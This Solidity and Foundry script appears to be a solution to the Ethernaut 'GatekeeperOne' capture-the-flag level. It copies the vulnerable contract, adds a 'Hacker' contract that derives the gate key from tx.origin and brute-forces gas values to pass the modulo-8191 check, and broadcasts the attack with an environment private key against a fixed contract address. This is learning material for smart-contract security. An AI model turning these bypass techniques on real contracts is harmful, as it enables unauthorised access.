// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console.sol";



contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Hacker {
    function enter (address target) external {
        GatekeeperOne gatekeeper = GatekeeperOne(target);
        bytes8 gateKey;
        uint16 k16 = uint16(uint160(tx.origin));
        uint64 k64 = uint64(1<<63) + uint64(k16);
        gateKey = bytes8(k64);

        for (uint256 i = 150; i < 500; i++) {
            uint256 totalGas = i + (8191);
            (bool result, ) = address(gatekeeper).call{gas: totalGas}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );         
            if(result){
                console.log("gas", i);
                break;
            }
        }
    }
}

contract DeployScript is Script {
    function setUp() public view {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        address target = 0xdb2A3d6c6E49471134ffEABA68CBd5c2D0fE17A0;
        Hacker hack = new Hacker();
        hack.enter(target);

        vm.stopBroadcast();
    }
}